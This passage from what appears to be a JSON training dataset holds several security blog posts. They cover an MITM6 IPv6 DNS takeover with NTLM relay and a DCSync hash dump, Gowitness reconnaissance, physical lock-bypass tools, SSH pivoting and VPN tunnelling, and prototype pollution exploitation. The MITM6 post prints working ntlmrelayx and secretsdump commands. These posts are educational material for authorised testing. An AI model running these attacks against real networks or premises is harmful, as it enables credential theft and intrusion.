        "output": "Title: \"MITM6 Strikes Again: The Dark Side of IPv6\"\nTaxonomies: \"Dale Hobbs, External/Internal, How-To, Informational, InfoSec 201, IPv6, Machine-in-the-Middle, MITM6, ntlmrelayx, Replication-Get-Changes-All\"\nCreation Date: \"Tue, 14 Feb 2023 16:30:00 +0000\"\nDale Hobbs //\n\nAs the world becomes increasingly connected through the internet, cyber attacks have become more sophisticated and prevalent. One type of attack that you may not have heard of is the Machine-in-the-Middle IPv6 (MITM6) attack. In this article, we'll explore what MITM6 attacks are, how they work, and what you can do to protect yourself and your organization against them. \n\nWhat is an MITM6 Attack? \n\nMITM6  is a type of attack that involves intercepting and manipulating the communication between two parties. In this attack, the attacker positions themselves between the two parties and acts as a proxy, allowing them to intercept and alter the communication between the parties. \n\nOne common method for carrying out an MITM6 attack is through the use of a rogue IPv6 DHCP server. The attacker can set up a rogue DHCP server and advertise itself as the default DNS server to devices on the network. When a device sends a request to communicate with another device, the rogue router intercepts the request and establishes a connection with the target device on behalf of the original sender. The attacker can then use this position to intercept and alter the communication between the two devices. \n\nDNS Takeover attacks via IPv6 \n\nTypically, people are running IPv4 on their networks. However, IPv6 is also enabled by default on your network. If you look at the network adapter properties on your system, you will likely find that IPv6 is turned on, even though you\u2019re using IPv4. \n\nTo top it off, IPv6 is most likely set to obtain an IPv6 address automatically from a DHCP server, but in most cases, people are not actively managing IPv6 on the network. As such, DHCP is usually not configured to manage IPv6 on the network.  \n\nThis brings up the question: who or what is providing DNS services for IPv6 on the network? A majority of the time, the answer to that is nobody and nothing!  \n\nThis means that an attacker can set up a system to listen for IPv6 DNS requests and respond to them by telling the client to send all of its IPv6 traffic to the attacker\u2019s system. Often, this can allow an attacker to get authentication to a Domain Controller via LDAP or SMB.  \n\nHow, you ask? Well, when an attacker\u2019s machine is intercepting IPv6 traffic, they can intercept authentication requests, intercept the NTLM credentials, and relay them using ntlmrelayx to a Domain Controller. If the relayed authentication request was from a Domain Administrator, the attacker can then use that NTLM credential to create a user account for themselves on the domain. The best part about this is that the mitm6 tool automagically does all of this for you.  \n\nLet\u2019s walk through what this attack looks like. First things first, you need to download and install the mitm6 tool from https://github.com/dirkjanm/mitm6. Once that\u2019s done, simply run the tool as seen below. In my case, the domain we\u2019re testing with is called adlab.com; you should replace it with your own domain name.  \n\nAs you can see, we pretty quickly started to see IPv6 requests on the network indicating that IPv6 addressing is not managed on the network. \n\nNext, we\u2019re going to set up ntlmrelayx to relay the requests to LDAPS on a domain controller, send the client a fake WPAD file, and automatically dump out any information we find to a folder called \u2018loot\u2019 on the local system. As you can see below, a connection request came in, our attacking system relayed the connection attempt to the Domain Controller at 192.168.190.200, and successfully authenticated.  \n\nimpacket-ntlmrelayx -6 -t ldaps://192.168.190.200 -wh fakewpad.adlab.com -l loot \n\nNow, if we look in our \u2018loot\u2019 directory, we can see we\u2019ve collected a lot of information such as the computers and users on the domain, as well as the domain password policy.  \n\nThis in itself is incredibly useful, as we now have a list of domain users that we could launch password attacks against. But wait\u2026 there\u2019s more! As luck would have it, an administrator logged in to a computer on the network, and we can see that the users\u2019 credentials were relayed to LDAPS and created a user account on the domain for us.  \n\nSo now we have a user account on the domain named \u2018NbuCuQKhZW\u2019 with a password of \u2018v(Zt<)J_Snii$uo\u2019. If we look in Active Directory, we can confirm that the user account was created. \n\nNot only did it create an account for us, but it created the account with an ACL (Access Control List) providing the user account with the \u2018Replication-Get-Changes-All\u2019 privileges on the domain. The \u2018Replication-Get-Changes-All\u2019 right in Active Directory allows you to request everything out of Active Directory including password hashes. If we look at the ACL for domain, we can confirm that the user account has \u2018Replication-Get-Changes-All\u2019 privileges on the domain.\n\nSo now that we have a privileged user account on the domain, we can use a tool like secretsdump.py to perform a DCSync against the domain controller and download all of the password hashes from the domain. (mitm6 was even kind enough to suggest using secretsdump.py).\n\nimpacket-secretsdump -just-dc-ntlm adlabs.com/NbuCuQKhZW@192.168.190.200\n\nSecretsdump will prompt for the password of the user account, in this case that user account was \u2018NbuCuQKhZW\u2019 with the password \u2018v(Zt<)J_Snii$uo\u2019.\n\nAs you can see in the image above, we have successfully dumped the users and password hashes from the domain. These can now be taken offline to a password cracking system where you can use a password cracker such as Hashcat to attempt to crack the passwords.\n\nHow Can You Protect Yourself Against MITM6 Attacks?\n\nMITM6 attacks can be difficult to detect and prevent, as they often involve sophisticated techniques and tools. However, there are steps that organizations and individuals can take to protect against these types of attacks:\n\nDisabling IPv6 if it is not used on your internal network will prevent Windows clients from querying for a DHCPv6 server thereby making it impossible to take over the DNS server.\n\nDisable the Proxy Auto detection via Group Policy. If your company uses a proxy configuration file internally (PAC file) it is recommended to explicitly configure the PAC URL instead of relying on WPAD to detect it automatically.\n\nIn order to prevent NTLM relaying you should consider disabling it entirely and switch to Kerberos or, if that isn't possible, you should:\n\nenable SMB signing to prevent relaying to SMB by requiring all traffic to be signed\n\nenable LDAP signing to prevent unsigned connections to LDAP\n\nEnable extended protection for authentication which will prevent some relaying attacks by ensuring that the TLS channel used for the connection to the server is the same that the client uses when authenticating.\n\nIn conclusion, MITM6 attacks are a serious threat to the security of your communication. By properly managing IPv6 on your network, you can help protect yourself and your organization against these types of attacks.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Gowitness, a Testers Time Saver\"\nTaxonomies: \"Alyssa Snow, External/Internal, General InfoSec Tips & Tricks, How-To, Informational, Recon, Web App\"\nCreation Date: \"Thu, 16 Feb 2023 18:30:00 +0000\"\nAlyssa Snow // \n\nDuring an external or internal network penetration test, it can be challenging to comb through each web server in scope to find the juicy stuff. During a timeboxed assessment, a tool like Gowitness (https://github.com/sensepost/gowitness/wiki) can help prioritize the web applications available on your target network.  \n\nGowitness is an automated website screenshot tool, inspired by Eyewitness (https://github.com/FortyNorthSecurity/EyeWitness), written in Golang. Gowitness navigates to each web application and uses a headless browser to generate screenshots of the web application. It fingerprints these applications by capturing the HTML response and HTTP headers. Additionally, Gowitness attempts to identify technologies used by the application. Next, it generates a report that allows the tester to browse through the available web services easily. \n\nInstallation \n\nGowitness installation can be as simple as downloading one of the prebuilt binaries found here: https://github.com/sensepost/gowitness/releases. \n\nYou can install the tool with go as follows:  \n\ngo install github.com/sensepost/gowitness@latest \n\nYou can run the tool using a docker container:  \n\ndocker pull leonjza/gowitness \n\nYou can also clone the repository and compile the tool from the source code:  \n\ngit clone https://github.com/sensepost/gowitness.git \ncd gowitness \nmake linux \n\nMake sure you have Chrome and Golang installed on your machine before attempting to use the tool. \n\nGowitness Scanning\n\nThere are many other automated screenshot tools, and I encourage you to investigate whichever interests you most. We also have another blog post about Eyewitness (https://www.blackhillsinfosec.com/eyewitness-and-why-it-rocks/). One cool feature Eyewitness has that I hope to see Gowitness implement at some point is default credential identification. Eyewitness will supply the user with default credentials (if it knows them) alongside the application HTTP header information. I use Gowitness because I am a fan of Golang, and I like the tool\u2019s UI.  \n\nI typically use Gowitness to process Nessus and Nmap scan results. Gowitness accepts targets in several formats. You can provide the tool with a single target URL, a list of URLs, IPs, or CIDRs.  \n\nProcess Nessus scan command: \n\ngowitness nessus -f basic-scan.nessus \n\nGoWitness can process Nmap results in XML format. To output Nmap results in XML format you can run Nmap using the -o flag with argument X. An example of this is shown below. \n\nnmap -oX nmap-results.xml \n\nPartial Nmap XML Results \n\nProcess Nmap scan command: \n\ngowitness nmap -f nmap-results.xml \n\nGowitness has various flag options that can be used to fine-tune your scan. For example, the --user-agent flag. The default user agent string is \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36\". Let\u2019s say you wanted to experiment with different results using a mobile user-agent string; you may set this flag value to something like --user-agent \u201cMozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/603.1.23 (KHTML, like Gecko) Version/10.0 Mobile/14E5239e Safari/602.1\u201d.  \n\nI have listed a couple of other useful flags below: \n\n--timeout - timeout string. The default is 10 seconds. \n\n-t/--threads - threads used to run Gowitness. The default is 4 threads. \n\nIf you are on a reliable network but you have many invalid domains, you might consider reducing the timeout to 4 to reduce the scanning time. \n\nI recommend setting the thread count to somewhere between 1 and 2 times the number of cores on your system. So, if your system has 4 cores, you could set the threads to 8. You can keep an eye on your CPU usage and tune up or down if you hit bottlenecks or still have unused cycles. \n\n Gowitness Results  \n\nGowitness stores a screenshot of each of the target URLs in a folder called screenshots. Additionally, Gowitness creates an SQLite database stored in the file gowitness.sqlite. To view the Gowitness results first, start up the web server, run the following command, then navigate to http://localhost:7171 in your browser. \n\n gowitness server -A \n\nStatistics Dashboard \n\nThe landing page of our Gowitness server displays the statistics detailing the number of processed URLs, DNS names, and certificates, as well as unique technologies observed on the target web servers. If a new target pops up, you can easily submit a new URL via the UI by clicking \"Submit New URL.\" \n\nSubmit New Target  \n\nGowitness also supports dark mode, which does not necessarily make a difference functionally, but it is a feature I love.  \n\nDark Mode  \n\nYou can review the results in a table format by clicking \"Table View\" or view the various web applications in \"Gallery View.\"  \n\nTable View  \n\nWhile viewing the results in Gallery mode, you can enable perception sort, which will sort the results based on images that look alike. Perception sort allows you to group targets running the same web services and makes testing for issues like default credentials a breeze.  \n\nPerception Sort Gallery Mode  \n\nEach entry displays the screenshot captured, technologies, the HTTP Response Headers, and other details such as the console log, network log, DOM, and TLS information.  \n\nScreenshot and HTTP Headers  \n\nGowitness results are easily searchable. You can retrieve results for URLs, HTTP Headers, Console logs, and network logs by typing a query in the search bar. For example, the following figure shows the search results for all web servers running JQMIGRATE. \n\nJQMIGRATE Query  \n\nWe can identify Apache web servers by searching for Apache in the HTTP headers.  \n\nApache Headers  \n\nWe could also query Gowitness API to gather similar details.\n\nAPI Query  \n\nOnce you have investigated the processed Gowitness results, you can generate a consolidated report. Gowitness will create a zip archive of the necessary files and an HTML document of the results.  \n\ngowitness report -f example.zip \n\nConsolidated Report  \n\nGowitness is an excellent automated screenshot tool that can be extremely useful to help a tester get a quick overview of an extensive list of URLs or scan data post-processing.  \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Tales From the Pick: Intro to Physical Security Tools\"\nTaxonomies: \"How-To, Joseph Kingstone, Physical\"\nCreation Date: \"Tue, 21 Feb 2023 17:42:22 +0000\"\nJoseph Kingstone //\n\nLooking to get into physical security? Not sure what you need to get started? Look no further. \n\nWhat are Physical Security Assessments?  \n\nPhysical security assessments evaluate an organization's physical security measures to identify potential risks and vulnerabilities that could compromise the safety and security of its people, assets, and facilities. The assessment typically involves a combination of physical inspections, bypasses/lockpicking, tailgating, and access control abuse to name a few. This assists in assessing the effectiveness of existing security measures and identifying areas for improvement.  \n\nThis is a basic list of tools, where to get them, and videos on how to use them. (Access controls and badge cloning aren't included, but there may be a Part 2 in the future.)\n\nEnvironmental Considerations \n\nAwareness of your environment is crucial. Being aware of your environment could be the key to you not needing a key.  \n\nTLDR; Just look at it!\n\nSebaceous Oils \n\nLet\u2019s begin with a common bypass that is seen with keypads all over the world. Sebaceous oils. Sebaceous oils are simply oils from your fingers that could cause discoloration on a keypad. Anyone could use this to guess the correct combination. Below is an example. Can you guess the combination?  \n\nCongrats! You probably guessed correctly. \n\nI'm Snow Excited! \n\nAnother use case Is simply looking around your environment for a way In. Here Is an interesting edge case where the snowbank was high enough to clear a barbed wire fence. \n\nThis doesn\u2019t apply to just snow. It could be new construction with dirt or even pallets that are high off the ground. \n\nLock Bypasses \n\nWhy lock bypasses? It's fast and usually easy. Low complexity and high impact is always valuable for a client. You don't need to be a rocket surgeon to use these simple tools. \n\nTraveler Hook\n\nThis can be purchased from MBUSA for $3.99. Also known as a shrum tool, this tool Is capable of bypassing dead latched locks. These locks are almost everywhere.  \n\nOften, the deadlatch plunger is not set properly. If not set properly, an attacker could simply insert the traveler hook in the door gap and push the locking mechanism in, opening the door in a matter of seconds. Check out this video from our friends at Covert Instruments. \n\nhttps://www.youtube.com/embed/9Vo9XxIMACc\n\nKnife Bypass \n\nA knife bypass tool is another simple bypass that could be used on certain padlocks. It's as simple as sticking the bypass tool into the lock, bypassing the locking mechanism. You can also use this tool to decode combination locks and file cabinets. This tool can be found at Sparrows for $14.95. \n\nhttps://www.youtube.com/embed/l9wMfmNM-RI\n\nWafer Key Bypass\n\nWarded locks, often located outside of a facility to secure power generators and other valuable assets, can be picked with a wafer key. This product can be purchased from LockPickWorld for 18.99.\n\nhttps://www.youtube.com/embed/MkiN-rXhjL0\n\nDouble Door Tool\n\nThe double door tool allows an attacker to engage push bars located on double doors from the outside. You can purchase the DDT from Sparrows for $16.00. \n\nhttps://www.youtube.com/embed/eUJBXjLKIos\n\nThumb Turn Tool \n\nOtherwise known as a J-Tool, this tool can fit in between door gaps and twist the handle that twists the bypass mechanism, allowing an attacker to open the door from the outside simply by turning the knob. This tool can be purchased at Covert Instruments. \n\nhttps://www.youtube.com/embed/1ciqsCJD3f0\n\nUnder Door Tool \n\nOne of the oldest bypass tools, an under door tool can be leveraged by placing it under a door, rotating the hook, and pulling the door lever down. This tool can be purchased at Sparrows.\n\nhttps://www.youtube.com/embed/QSQo4bcfLbY\n\nLock Picks \n\nSometimes a bypass tool isn't enough, and you\u2019ll need to use lockpicks to gain access during an engagement. Bypasses are ideal, but you sometimes need to roll your sleeves up and do some picking. A good starter is the Tuxedo Kit from Sparrows. From personal experience, I would suggest purchasing additional tensioners for stubborn locks. \n\nHere is a great example of a mica shim not working:\n\nNext, I did a little bit of picking and voila! \n\nLock Pick Belt Ranking\n\nIf you have never picked a lock, aren't someone who performs physical security engagements, or are just interested in locksport\u2026 there Is a Reddit post that has a belt ranking system from white belt all the way to black belt. It contains locks for each belt and criteria to be ranked. It's a fun thing to do in your free time (or maybe during a meeting that you aren't actively engaged in).\n\nHere are a few locks to get you started: \n\nWhite Belt - Abus 45 \n\nYellow Belt - Master Lock 130 \n\nOrange Belt - Master Lock 150 \n\nIn Closing (the door...)\n\nThere you have it! Some simple tips and tricks to get your started in your physical security journey. All it takes is the right tools and a little know-how.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Forwarding Traffic Through SSH\"\nTaxonomies: \"Fernando Panizza, General InfoSec Tips & Tricks, How-To, Informational\"\nCreation Date: \"Thu, 23 Feb 2023 19:06:31 +0000\"\nFernando Panizza //\n\nThis was meant to be an OpenSSH how-to blog, but since I had time, I decided to read the man pages (manual pages that you can access on a Linux terminal by typing man ssh) and had fun chasing every possible rabbit hole while at it. While going through the man pages, I learned that it was possible to use SSH to set up VPN networks and decided to give it a try. Although I just learned this and haven\u2019t used it on a test yet, I think it could be a nice to have resource, especially in cases where the tool in use does not support SOCKS proxies or the protocol is not supported by Proxychains.\n\nPort Forwarding\n\nPort forwarding with SSH is a very well-documented subject, but here is a quick recap in case you\u2019re new to it. (You can also find a video explanation by Ralph May here: https://www.youtube.com/watch?v=zG4jYmHoEr8&t=348s)\n\nSSH can be used for local, remote, and dynamic port forwarding. Local port forwarding basically opens a port on your local machine (the one that you\u2019re SSHing from) and forwards its traffic to a remote port on the machine or the network you are connecting to. This can be useful once you obtain shell access to a system and find services listening on the loopback or an internal interface. Local port forwarding will allow you to forward that service to a port on your local machine.\n\nThe syntax for the command is the following:\n\nssh \u2013N -L local_port:remote_service_ip:remote_service_port\n\nOptionally, you can specify on which interface you want the port to listen by adding the IP address before the port.\n\nssh \u2013N -L local_ip:local_port:remote_service_ip:remote_service_port\n\nAs an example, let\u2019s say you have access to a system (192.168.136.120) and after running netstat, you found that there is a service running on port 8080 of the loopback interface.\n\nFor demonstration purposes, we are going to use the Python\u2019s http.server module to set a web server listening in the loopback interface of our target host, which will be hosting a simple text file.\n\nOn the target host, we run the following commands to create the file and start the server:\n\necho \"This is a local service\" > file.txt\npython3 -m http.server --bind 127.0.0.1 8080\n\nServer Started on Target Machine\n\nYou can forward that port to your local machine with the following command:\n\nssh -N -L 8081:127.0.0.1:8080 user@192.168.136.120\n\nThis will open port 8081 on your local machine and forward all its traffic to 127.0.0.1:8080 on the remote machine 192.168.136.120.\n\nNow if we request the file at http://127.0.0.1:8081/file.txt on the testing machine, we should be able to access the file hosted at 127.0.0.1:8080 on the target machine.\n\nFile Accessed Using Local Port Forward\n\nRemote port forwarding behaves in the opposite way. It opens a port on the remote machine and forwards all the traffic to that port from the remote network to a local port on the local machine or network. This can be useful when you want to forward a local port to listen on a remote machine.\n\nThe syntax for remote port forwarding is similar; this time the -R flag is used, and the remote ip and port are specified first.\n\nssh -N -R [remote_service_ip]:remote_port:local_ip:local_port\n\nGoing back to the previous example, let\u2019s say you find yourself in the same situation \u2014 having access to the system (192.168.136.120) and finding a service listening at 127.0.0.1:8080, but this time ingress traffic is blocked on port 22 of the target machine so local port forwarding is not an option. In cases like this, you can use remote port forwarding to achieve the same result. You can use SSH from the target computer to connect to your testing machine and forward local port 8080 on the target to the remote port 8081 on your testing machine.\n\nssh -N -R 8081:127.0.0.1:8080 tester@192.168.136.130\n\nSSH Remote Port Forward to Testing Machine\n\nOnce again, you can interact with the service on 127.0.0.1:8081 on your testing machine.\n\nFile Requested over Remote Port Forwarding\n\nDynamic port forwarding starts a SOCKS proxy on your local machine and forwards all the traffic going to that proxy to the remote machine where the connection will be routed based on the application protocol.\n\nThis can be useful when you are in a situation that requires access to multiple ports on the remote network. Dynamic port forward is specified by using the -D flag alongside the listening port on the local system.\n\nssh -D local_port user@host \n\nLet\u2019s go back to the previous examples, but, this time, let\u2019s say that instead of finding a service listening on the localhost, you found connections to other hosts and want to enumerate the internal network. In this case, you can use the following command for dynamic port forwarding. The following command will start a SOCKS proxy on port 1080 on the local machine.\n\nssh -D 1080 user@192.168.136.120\n\nThis will create a local SOCKS proxy which will forward any incoming connection to local port 1080 to the remote system. To interact with the local SOCKS proxy, you can use tools such as BurpSuite, a web browser, Proxychains, or any other that supports SOCKS proxies.\n\nAs an example, we can use Proxychains and Nmap to run a connect scan on the internal network. Proxychains, by default, will attempt to connect to socks4 proxies on port 9050, as stated in its configuration file /etc/proxychains4.conf. We need to modify this configuration with the port where our proxy is listening. The following command can be used to change the configuration file:\n\nsed -i 's/^socks4.*/socks5 127.0.0.1 1080/' /etc/proxychains4.conf\n\nYour configuration file should look like this now.\n\nProxychains4 Configuration File\n\nNow we can use Proxychains to run Nmap on the internal network, as shown in the following example where we scan the host 10.10.10.128.\n\nproxychains4 -q nmap -sT -Pn 10.10.10.128\n\nConnect Scan Running\n\nSSH VPN\n\nAlthough port forwarding is the most straightforward method and doesn\u2019t require high privileges on the target to set up, we may run into limitations with tools not fully supporting SOCKS proxies. For instance, at the time of this writing, Proxychains only supports TCP, which limits the types of scans and attacks we can do in the remote network. If we try a UDP scan or SYN scan through Proxychains, it will fail, since UDP is not supported, and the SYN scan breaks the TCP handshake.\n\nFailed SYN Scan Using Proxychains\n\nHere is where I think SSH VPNs can be useful, since it sets up a point-to-point connection at layer 3, which allows to overcome those limitations. Again, I\u2019m not saying this is a replacement for port forwarding but can be a useful resource if you have root access on the target system. To achieve this, a series of configurations are needed both on the testing machine as well as the target machine.\n\nFirst, we need to add and configure a tun interface on the testing machine by running the following commands as root:\n\nip tuntap add mode tun tun0\nip link set dev tun0 up\nip addr add 10.1.1.10/24 dev tun0\n\nRunning the command ip addr show tun0 in the testing machine should show a new interface with the IP address 10.1.1.10.\n\nTun0 Interface Configuration on Testing Machine\n\nThen we need to set up a route to the target\u2019s internal network through the new tun0 interface.\n\nip route add 10.10.10.0/24 via 10.1.1.10\n\nRunning the command ip route show on the testing machine should display the routing information containing the newly added route.\n\nRouting Configuration on Testing Machine\n\nNow on the target machine, we need to enable tunneling on the SSH server by setting the PermitTunnel option to yes, then reload the service. You can use a text editor to add that option to the file /etc/ssh/sshd_config.\n\nPermitTunnel yes\n\nThen reload the configuration, using systemctl reload sshd.\n\nNow that SSH is allowing tunnels, we can set up the tun interface on the target system the same way we did in the testing machine.\n\nip tuntap add mode tun tun0\nip link set dev tun0 up\nip addr add 10.1.1.20/24 dev tun0\n\nTun0 Interface Configuration on Target Machine\n\nAnd add a route from the internal network to our SSH VPN.\n\nip route add 10.1.1.0/24 via 10.1.1.20\n\nNow, there are a few more configurations that need to be set up on the target system. First, IP forwarding needs to be enabled on both the newly created tun interface and the external interface which can be reached from our testing machine. Credits to Tim Fowler who helped me with the IP forwarding and NAT set up.\n\nsysctl -w net.ipv4.conf.tun0.forwarding=1\nsysctl -w net.ipv4.conf.ens36.forwarding=1\n\nAlso enable NAT on the target system so that incoming packets to the target system know where to go.\n\niptables -t nat -A POSTROUTING -o -j MASQUERADE\n\nWhere is the target system\u2019s internal interface, which in my case is ens36.\n\nIptables NAT Rule on Internal Interface\n\nFinally, we can use SSH to tunnel both interfaces and access the internal network. The -f flag is used to background the process while the -w flag, with the argument 0:0,indicates the command to forward the tunnel device 0 on the local machine to the tunnel device 0 on the remote machine, and true is the command to be executed to fork the process to the background (this can be any command).\n\nssh -f -w 0:0 user@192.168.136.120 true\n\nWe should now have an established connection with port 22 of the target host that we can check with the command ss -at '( dport = :22 )'.\n\nSSH Tunnel Established\n\nAfter the tunnel is established, we can interact directly with the internal network without having to use Proxychains, conduct SYN scans, and interact with other protocols, such as ICMP or UDP.\n\nNmap SYN Scan over SSH VPN\n\nClosing Thoughts\n\nWhile a VPN setup can be an improvement over a SOCKS proxy under certain conditions, it requires more configuration and also root access. Moreover, I was only able to make it work on Linux-to-Linux connections at the time of writing this blog. Also, port forwarding may be a better option if your tools fully support SOCKS5 (and the only option if you don't have root access).\n\nNonetheless, as penetration testers, we never know what kind of situations we are going to encounter, and having an extra resource can make a huge difference on a test.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Hit the Ground Running with Prototype Pollution\"\nTaxonomies: \"Finding, How-To, Informational, Isaac Burton, Web App, Prototype Pollution, Web API\"\nCreation Date: \"Tue, 28 Feb 2023 18:47:31 +0000\"\nIsaac Burton //\n\nFor as long as we have known about prototype pollution vulnerabilities, there has been confusion on what they are and how they can be exploited. We\u2019re going to discuss some of the easiest ways to identify a prototype pollution vulnerability in the wild, which can lead to all kinds of exploitation! \n\nPrototype pollution can exist server side or client side. Server-side prototype pollution can be used to modify application control flow, which can be fun and rewarding to exploit. When a prototype pollution vulnerability is present client-side, it can be leveraged to perform cross-site scripting (XSS). In both cases, exploiting prototype pollution is heavily dependent on context. Fortunately, identifying the vulnerability is often not so difficult.  \n\nWe're going to jump into a couple examples just to show how easy identifying this vulnerability can be. Then, we will dig into why these vulnerabilities occur and explore other methods of identification and exploitation.  \n\nFinding Server-Side Prototype Pollution \n\nOne of the easiest ways to identify this vulnerability is to send an API method to Burp Suite's Repeater and wrap a JSON formatted request body in a \u2018__proto__\u2019 object.  \n\nThe example below shows a request that is valid for an imaginary pizza restaurant's website. As an example, the user is supplying their favorite pizza type and phone number so that they can sign up for a rewards program.  \n\nOn the backend, the API parses the request body and makes sure that all the required parameters are present. If we sent the request below, we would receive a 400 Bad Request response.  \n\nWe can use this input validation to our advantage. We then wrap the valid request body in a \u2018__proto__\u2019 object as shown below, to which the application returns a 200 OK response.  \n\nIt may seem strange that this works, but it's our first indicator that there is a vulnerability here. At this point, there are two potential reasons that this request was accepted: \n\n1. The API searches the request body for valid request keys.  \n\n2. An unsafe merge is being performed (more on this later.) \n\nWe can send the request below to rule out the first option. If the application is searching for valid keys, then we should be able to change the \u2018__proto__\u2019 object to anything else and the application will respond 200 OK. As an example, we will change \u2018__proto__\u2019 to `false_positive`.  \n\nSince the application rejected this request, we can assume that the \u2018__proto__\u2019 object has a special meaning in the application. Feel free to try variations such as \u2018_proto_\u2019 or \u2018__proto\u2019, the responses should all return 400 Bad Request.  \n\nIf you only receive 200 OK responses when the object's name is \u2018__proto__\u2019, then congratulations, you just found a server-side prototype pollution vulnerability! Later, we will dive deeper into why this works and how this can be exploited.  \n\nTesting for Client-Side Prototype Pollution \n\nPortSwigger has added automated prototype pollution identification and exploitation into their browser tool, DOM Invader. The tool can identify sinks and gadgets, and even create a proof-of-concept exploit! \n\nSinks are places in the code where you can modify the prototype object, such as a URL parameter that is unsafely handled by the application. Gadgets are locations where polluted objects can be leveraged for exploitation. DOM Invader makes finding sinks and gadgets easy, just be sure that you have an updated version of Burp Suite and follow the steps below: \n\n1. Open DOM Invader in Burp (Proxy > Intercept > Open Browser). \n\n2. Go to extensions in the browser, enable the Burp Suite extension: \n\n3.  Turn on DOM Invader and prototype pollution in the extension.\n\n4. Reload the page and open the Inspector, then navigate to the newly added 'DOM Invader' tab. \n\n5.  If the tool identifies sinks, then open the extension back up and enable gadget scanning. \n\n6. Reload and navigate back to the Inspector's 'DOM Invader' tab. You should see a progress bar at the top. If any gadgets are identified for the previously found sinks, then you should see an option to generate a proof-of-concept exploit as shown below.  \n\nThe DOM Invader extension is quite powerful and effective at searching through client-side code, which is often minified and difficult to read in the wild. If you are interested in the manual approach, I highly recommend checking out PortSwigger Academy\u2019s course on prototype pollution (https://portswigger.net/web-security/prototype-pollution).\n\nHow Does Prototype Pollution Work?\n\nSo, why is the \u2018__proto__\u2019 object special? If you are familiar with object-oriented programming, the word 'inheritance' should ring a bell. When new objects are created, they gain properties from their class, along with any parent classes. In JavaScript, there is the concept of a 'prototype' object, which is essentially the root parent that all objects inherit from. \n\nIn JavaScript, the prototype object is writable, even at runtime. If any properties are added to the prototype, then every newly created object will have the property. This can allow us to modify variables that developers never intended (or expected) us to control! \n\nConsider a server-side merge function which takes the properties from one object and updates them in another. You may want to save some of the properties stored in the destination object and only update values that are described in the source object. Furthermore, objects contained inside other objects need to be copied in the same manner. The code snippet below could be a solution to this problem.  \n\nThe vulnerability here may not be obvious. If an attacker includes a \u2018__proto__\u2019 key with the value set to an object, the recursion will not only write to the current object\u2019s prototype, but also the global object\u2019s prototype. This means that all newly created objects will inherit properties defined by the attacker. The consequences of this are only limited by the attacker\u2019s imagination. \n\nServer-Side Prototype Pollution Exploitation \n\nSince we cannot go over every possible situation, we will just look at a couple examples of how we can leverage this vulnerability. \n\nEstablishing Context \n\nContext is king when it comes to prototype pollution. The difficulty with exploiting anything server-side is that you typically cannot see what\u2019s on the other side. First, do as much discovery as you can. Use Gobuster (https://github.com/OJ/gobuster) and discovery wordlists from SecLists (https://github.com/danielmiessler/SecLists) to find hidden files and locations on the server. If you\u2019re lucky, you may find a source code repository. If the project itself is open-source, you\u2019re all set to start digging.\n\nSince the global prototype will be polluted for the life of the thread, you may be able to take advantage of open-source libraries used by the application. Try to force the server to return error messages through fuzzing. One of my favorite tool choices for this is with Burp Suite Intruder and the wordlists provided in wfuzz (https://github.com/xmendez/wfuzz). Once the attack is completed, you can sort the responses by length and status code, and even search for error message keywords.\n\nThe error messages you receive may return partial \u2014 if not detailed \u2014 stack traces that can help you map the backend source code. Also, if you can identify any libraries used by the application, you may be able to take advantage of the context provided by the sources.  \n\nExample \n\nAs an example, let\u2019s assume that the application performs the following steps upon receiving a POST request: \n\nThe server checks the session token provided in the request headers and accepts or rejects the request. The user\u2019s ID is stored in the thread\u2019s memory for later.  \n\nThe URL is matched to a function which updates the user\u2019s profile.  \n\nThe function (unsafely) merges the request data into an object to hold the user-supplied data. \n\nThe server verifies that all required properties are included. \n\nThe application creates a user object from information stored in a database.  \n\nA privilege check is performed on the user object, where a property is only set for administrative users.  \n\nThe function completes its routine by writing back to the user database and returning 200 OK.  \n\nIn this scenario, an attacker could simply add the administrative property to the \u2018__proto__\u2019 object, which elevates privilege for the request. Remember that every object which is created after prototype pollution is exploited is affected.  \n\nConclusion \n\nWith the prevalence of JavaScript API\u2019s, the strange quirks of the language itself, and the non-obvious nature of the vulnerability, it\u2019s my opinion that we haven\u2019t fully discovered the danger and exploitation potential.  \n\nFinally, I\u2019d like to point you to some resources that will help you explore this topic further. Olivier Arteau wrote a fantastic research paper on this topic, which includes discovery and exploitation examples from JavaScript libraries found in the wild:\n\nhttps://raw.githubusercontent.com/HoLyVieR/prototype-pollution-nsec18/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf\n\nAnother fantastic writeup on this topic is from Changhui Xu, who describes the issue very clearly and provides more examples:\n\nhttps://codeburst.io/what-is-prototype-pollution-49482fc4b638\n\nBoth of the previous sources are referenced by the official CWE: Improperly Controlled Modification of Object Prototype Attributes (\u2018Prototype Pollution\u2019).  \n\nhttps://cwe.mitre.org/data/definitions/1321.html\n\nPortSwigger has a new course (as of this writing) on server-side prototype pollution, which is available on their academy website:\n\nhttps://portswigger.net/web-security/prototype-pollution/server-side\n\nLastly, I\u2019ve created a GitHub repository for the example described in the section above. The example is roughly 100 lines of code in one file with no dependencies and can be run with Node.js or in a browser console. Feel free to use this as a reference or a playground:\n\nhttps://github.com/syscl0ck/Prototype-Pollution\n\nHappy Hacking, \n\nIsaac \n\n"
    },
    {
        "input": "",
        "instruction": "",
